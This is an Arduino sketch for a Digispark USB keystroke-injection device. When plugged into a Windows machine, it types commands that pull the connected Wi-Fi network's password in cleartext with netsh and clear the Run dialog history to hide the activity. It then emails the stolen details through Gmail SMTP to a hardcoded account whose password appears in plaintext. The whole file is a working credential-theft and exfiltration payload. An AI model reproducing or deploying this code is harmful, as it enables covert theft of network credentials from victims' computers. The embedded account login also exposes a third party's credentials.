#include <avr/pgmspace.h>
#include "DigiKeyboard.h"
const char line1[] PROGMEM = "cmd";
const char line2[] PROGMEM = "cd \"%USERPROFILE%\\Desktop\" & for /f \"tokens=2 delims=: \" %A in ('netsh wlan show interface ^| findstr \"SSID\" ^| findstr /v \"BSSID\"') do set A=%A";
const char line3[] PROGMEM = "netsh wlan show profiles %A% key=clear | findstr /c:\"Network type\" /c:\"Authentication\" /c:\"Key Content\" | findstr /v \"broadcast\" | findstr /v \"Radio\">>A.txt";
const char line4[] PROGMEM = "for /f \"tokens=3 delims=: \" %A in ('findstr \"Network type\" A.txt') do set B=%A";
const char line5[] PROGMEM = "for /f \"tokens=2 delims=: \" %A in ('findstr \"Authentication\" A.txt') do set C=%A";
const char line6[] PROGMEM = "for /f \"tokens=3 delims=: \" %A in ('findstr \"Key Content\" A.txt') do set D=%A";
const char line7[] PROGMEM = "del A.txt";
const char line8[] PROGMEM = "echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt";
const char line9[] PROGMEM = "powershell";
const char line10[] PROGMEM = "REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f";
const char line11[] PROGMEM = "$SMTPServer = 'smtp.gmail.com'";
const char line12[] PROGMEM = "$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)";
const char line13[] PROGMEM = "$SMTPInfo.EnableSsl = $true";
const char line14[] PROGMEM = "$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('xxmikixx.dm@gmail.com', 'Mikolaj2006')";
const char line15[] PROGMEM = "$ReportEmail = New-Object System.Net.Mail.MailMessage";
const char line16[] PROGMEM = "$ReportEmail.From = 'xxmikixx.dm@gmail.com'";
const char line17[] PROGMEM = "$ReportEmail.To.Add('xxmikixx.dm@gmail.com')";
const char line18[] PROGMEM = "$ReportEmail.Subject = 'WiFi Password'";
const char line19[] PROGMEM = "$ReportEmail.Body = (Get-Content Log.txt | out-string)";
const char line20[] PROGMEM = "$SMTPInfo.Send($ReportEmail)";
const char line21[] PROGMEM = "del Log.txt";
const char line22[] PROGMEM = "exit";
const char line23[] PROGMEM = "exit";

char buffer[256];

#define GetPsz(x) (strncpy_P(buffer, (char*)x, 256))
#define KEY_UP_ARROW    0x52
#define KEY_DOWN_ARROW  0x51
#define KEY_LEFT_ARROW    0x50
#define KEY_RIGHT_ARROW   0x4F
#define KEY_LEFT_GUI      0xE3
#define KEY_ESC       0x29
#define KEY_TAB       0x2B

void digiBegin() {
  DigiKeyboard.sendKeyStroke(0,0);
  DigiKeyboard.delay(50);
}

void digiEnd() {
  const int led=1;
  pinMode(led, OUTPUT);
  while (1) {
    digitalWrite(led, !digitalRead(led));
    DigiKeyboard.delay(1000);
  }
}

void printText(char *txt) {
  DigiKeyboard.print(txt);
  DigiKeyboard.update();
}

void setup() {
  digiBegin();

  DigiKeyboard.delay(3000);

  DigiKeyboard.sendKeyStroke(KEY_D,MOD_GUI_LEFT);

  DigiKeyboard.delay(1000);

  DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);

  DigiKeyboard.delay(1000);

  printText(GetPsz(line1));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(1000);

  printText(GetPsz(line2));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line3));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line4));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line5));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line6));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line7));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line8));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line9));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line10));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line11));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line12));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line13));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line14));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line15));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line16));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line17));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line18));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line19));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line20));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  printText(GetPsz(line21));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(1000);

  printText(GetPsz(line22));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_CONTROL_LEFT);
  printText(GetPsz(line21));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  printText(GetPsz(line23));

  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(100);

  DigiKeyboard.delay(1000);
  digiEnd();

}
void loop() {}
